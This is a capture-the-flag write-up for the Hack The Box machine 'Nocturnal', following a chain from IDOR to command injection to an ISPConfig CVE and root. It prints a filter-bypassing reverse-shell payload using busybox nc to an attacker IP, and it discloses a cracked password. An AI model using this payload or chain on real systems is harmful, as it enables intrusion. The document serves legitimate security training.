Tags: #Linux/Ubuntu #Easy #Nginx #IDOR #Command-Injection #Weak-Hashing-Algorithms #Weak-Passwords #Outdated-software #Sensitive-Data-Exposure #Credential-Reuse #PHP-Code-Injection
# **Nmap Results**

```text
Nmap scan report for 10.10.11.64
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```
<br>
<br>

# **Service Enumeration**
Nmap discovers the hostname "nocturnal.htb", add to /etc/hosts file.

First look at the site:

![[Pasted image 20250622152739.png]]

There's an option to register. Using creds `test:test`

Dashboard page:

![[Pasted image 20250622152838.png]]

* `gobuster` in vhost mode returns nothing --> no hidden subdomains
* `feroxbuster` also returns nothing of interest

Uploaded random PDF file, I can click on it to download it again:

![[Pasted image 20250622153316.png]]

With burpsuite, I found a page "view.php" that accepts 2 parameters, **username** and **file**. The existence of the username parameter is odd because I'm already logged in.

Fuzz the username parameter with `ffuf` and the "xato-net-10-million-usernames.txt" wordlist, and there are a few results: admin, amanda, and tobias.

Amanda is the only user that has a file available to download, which is "privacy.odt". Use Libre Office to read it:

![[Pasted image 20250622225633.png]]

This password works for the web app. We see an option to "Go to Admin Panel" that leads us here:

![[Pasted image 20250622225902.png]]

Here, we can view the PHP source code for the web app's files.
<br>
<br>
# **Exploitation**
## **Initial Access**
Password field vulnerable to **Command Injection** because of this line in admin.php:
`$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";`

There is a function sanitizing input, but it doesn't blacklist everything, like newline and tab characters ("\n", "\t"). Spaces are banned, but in bash, tabs still count as a spaces, so it bypasses the PHP filter. 

Payload: `password\nbusybox\tnc\t10.10.14.4\t9001\t-e\tsh\n`, but we have to URL encode and send through burp, because a url encoded literal "\n" (%5Cn) is different from a newline (%0A)

Now logged in as www-data:

![[Pasted image 20250623170300.png]]

In the parent directory (/var/www), there's a folder **nocturnal_database** with a SQLite3 db file containing user creds:

![[Pasted image 20250623170922.png]]

Output of /etc/passwd with interactive shells:

![[Pasted image 20250623170506.png]]

Tobias is of interest. Hashes.com says his password is `slowmotionapocalypse`. 
SSH login successful.
<br>
<br>
# **Privilege Escalation**  
Checking open ports listening locally:
![[Pasted image 20250623171813.png]]

Port 8080 is the only one that seems to have a process attached as root:

![[Pasted image 20250623171842.png]]

Next step is to port forward with SSH and visit the server through our browser:

![[Pasted image 20250623172113.png]]
* Can't read environment variables for the process
* `/proc/<pid>/cmdline` contains nothing interesting

Output of `find / -name ispconfig 2>/dev/null:

![[Pasted image 20250623174117.png]]
* Can't look at anything in `/usr/local/ispconfig` or `/var/www/ispconfig`

Interesting file **auth.log**, in `/var/log/ispconfig`:

```
Successful login for user 'admin'  from 127.0.0.1 at 2025-04-09 10:19:13 with session ID vo10b400dv579klascjkkf1568
Successful login for user 'admin'  from 127.0.0.1 at 2025-04-09 10:54:48 with session ID k6cfshre0jfnp81hetdrc1c67a
Failed login for user 'root' from 127.0.0.1 at 2025-06-23 21:21:28
```

Username is admin, password is the same as Tobias' user account:

![[Pasted image 20250623175905.png]]

The help tab reveals **version** **3.2.10p1** is in use. There's a CVE for this version titled CVE-2023-46818 and a POC can be found on this [GitHub](https://github.com/rvizx/CVE-2023-46818) page

After running the exploit, we get root:

![[Pasted image 20250623215651.png]]

Shell is a bit unstable. Better to create SSH keypair and log in through SSH with the private key:

![[Pasted image 20250623215814.png]]

![[Pasted image 20250623231315.png]]
<br>
<br>
# Skills Learned
* If a payload you send over HTTP doesn't work, you might have to **URL encode** it. Make sure you're encoding properly by using an ASCII table. A literal "\n" is completely different from an actual newline escape character. 
* Credential reuse can happen, don't overlook this.
* If one POC script for a CVE doesn't work, try another. If you try 2 or 3 scripts and none of them work, then maybe that service isn't vulnerable, but you shouldn't stick to one. 
<br>
<br>
# Proof of Pwn
https://www.hackthebox.com/achievement/machine/391579/656